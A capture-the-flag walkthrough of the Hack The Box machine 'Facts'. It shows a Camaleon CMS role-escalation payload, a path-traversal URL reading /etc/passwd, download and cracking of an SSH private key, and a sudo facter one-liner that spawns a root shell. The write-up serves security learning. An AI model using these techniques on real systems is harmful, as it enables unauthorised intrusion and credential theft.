---
title: Facts
date: 2026-03-21
category: [HackTheBox, Linux, Web Exploitation, Password Attack, OSINT]
tags: [nmap, ffuf, johntheripper]
difficulty: Easy
summary: Facts is an easy rated box on Hack The Box
---

[Link to machine.](https://app.hackthebox.com/machines/Facts)

## Enumeration
Nmap SYN scan:
```bash
nmap -sVC -vv -p- --min-rate 5000 -oN facts-nmap <IP>
```
This gonna do SYN stealth scan on all ports with minimum rate of 5000 packets per seconds.
![Pasted image 20260320221329](../Images/Pasted%20image%2020260320221329.png)
Got some interesting results but I pay more attention on the nginx web server running on port 80. It resolves to `facts.htb`.
Run a directory enumeration scan while discovering the webpage:
```bash
ffuf -u http://facts.htb/FUZZ -w ../SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```
![Pasted image 20260320221628](../Images/Pasted%20image%2020260320221628.png)
Caught my attention on a directory `/admin`, which then redirects me to `/admin/login`. So let's create an account and log in to the admin panel
![Pasted image 20260320221835](../Images/Pasted%20image%2020260320221835.png)
But the Role showing here is `Client`, I also noticed that at the bottom of the page showing a Camaleon CMS (which is an advanced CMS based on Ruby on Rails) version 2.9.0. So I search for Camaleon CMS version 2.9 vulnerability and got into one github repo [CVE-2025-2304](https://github.com/Alien0ne/CVE-2025-2304). So since I don't wanna run arbitrary script (even if it's a PoC) of a stranger so I just hop in and see what it does. 
## CVE-2025-2304
So basically the vulnerability lies in the change password feature, where u can leverage your privilege to admin by appending `password[role]=admin` into the body of the patch request sent while changing password. Also when requesting to `url/admin/settings/site` u gonna get the s3 credentials in the response message.
## Back to the box
So grasping the thingy of the CVE, I opened Burp Suite, intercept the change password request and append the payload `password[role]:admin` (remember to do some url encode), forward the request and boom, now I've got the Administrator role.
![Pasted image 20260320222940](../Images/Pasted%20image%2020260320222940.png)
Ok so as in the PoC if I get into `/admin/settings/site` I'm gonna find some s3 credentials, which refers to the `Settings/General Site` tab on the web application:
![Pasted image 20260320224201](../Images/Pasted%20image%2020260320224201.png)
So now I have to configure my aws profile (I think) using those credentials to connect to the s3 bucket:
```bash
aws configure
```
![Pasted image 20260320224748](../Images/Pasted%20image%2020260320224748.png)
```bash
aws s3 ls --endpoint-url http://10.129.244.96:54321
```
![Pasted image 20260320230929](../Images/Pasted%20image%2020260320230929.png)
It shows that there are 2 directories on the s3 bucket endpoint.
![Pasted image 20260320231023](../Images/Pasted%20image%2020260320231023.png)
The randomfacts directory contains full of .png files.
![Pasted image 20260320231110](../Images/Pasted%20image%2020260320231110.png)
The internal directory actually containing a private key:
![Pasted image 20260320232300](../Images/Pasted%20image%2020260320232300.png)
![Pasted image 20260320232321](../Images/Pasted%20image%2020260320232321.png)
So I think I should get that private key in order to connect to the machine via ssh later?
```bash
aws s3 cp s3://internal/.ssh/id_ed25519 ./ssh_key --endpoint-url http://10.129.244.96:54321
```
![Pasted image 20260320234654](../Images/Pasted%20image%2020260320234654.png)
As it is shown above this private key has been encrypted by some passphrase, so we gonna need to crack it.
## Password crack
So first converting the encrypted file to a hash format using ssh2john.py, then crack it with john the ripper, the password is `dragonballz`. But I don't know what user to use this key for.
So after a while searching online, I ended up with a hint to [CVE-2024-46987](https://github.com/Goultarde/CVE-2024-46987)which is another vulnerability of Camaelon CMS that does affect version 2.9. 
## CVE-2024-46987
Okay so basically this CVE shows that the app with this vulnerability will allow authorized users to download arbitrary files from the server by manipulating the `file` parameter of the downloading API:
```url
http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
```
So by requesting to that url, you can download the passwd file from the server machine.
![Pasted image 20260320233554](../Images/Pasted%20image%2020260320233554.png)
So here we've found a user named `trivia` that has some link to `facts.htb`
Ok so now we can log in with the user trivia using the private key and the cracked passphrase
```bash
ssh -i ssh_key trivia@facts.htb
```
![Pasted image 20260321093008](../Images/Pasted%20image%2020260321093008.png)
And I was able to get the user flag.
Running the command `sudo -l`
![Pasted image 20260321093113](../Images/Pasted%20image%2020260321093113.png)
So the user trivia is able to run the /usr/bin/facter with root privileges and without being promted for password:
`(ALL)`: means the user can run the command as any user, including root
`NOPASSWD`: No password promt when running
So Copilot AI suggested me an OSINT tool called GTFOBins that shows possible exploitations for misconfigured executables.
![Pasted image 20260321094436](../Images/Pasted%20image%2020260321094436.png)
So as it's shown here that by using the `--custom-dir` flag, the `facter` will execute the .rb file in the directory. So I gotta give it a try:
```bash
echo 'exec("/bin/sh")' > /tmp/pwn.rb
sudo /usr/bin/facter --custom-dir=/tmp pwn
```
![Pasted image 20260321094630](../Images/Pasted%20image%2020260321094630.png)
And I got root shell.
And then I was able to find the root flag in `/root/root.txt`.